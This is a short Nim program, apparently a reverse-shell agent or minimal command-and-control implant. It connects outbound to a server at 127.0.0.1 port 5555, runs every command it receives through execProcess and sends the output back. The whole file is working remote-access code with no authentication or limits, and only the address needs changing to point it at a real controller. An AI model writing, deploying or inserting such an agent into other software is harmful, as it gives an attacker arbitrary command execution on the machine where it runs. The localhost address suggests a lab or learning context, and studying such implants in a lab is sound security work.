import net
import std/osproc

# We need to connect outbound
let client: Socket = newSocket()
client.connect("127.0.0.1", Port(5555))
stdout.writeLine("Agent: connected to server on address 127.0.0.1:5555")



while true:
  let command: string = client.recvLine()

  if command == "":
      break

  stdout.writeLine("Agent: received command: ", command)

  try:
    let response: string = execProcess(command)
    stdout.writeLine("Agent: command output: ", response)
    client.send(response & "\n")

  except IOError:
    client.send("IOError\r\L")
  except OSError:
    client.send("OSError\r\L")
  except:
    client.send("Unknown Exception")

client.close()
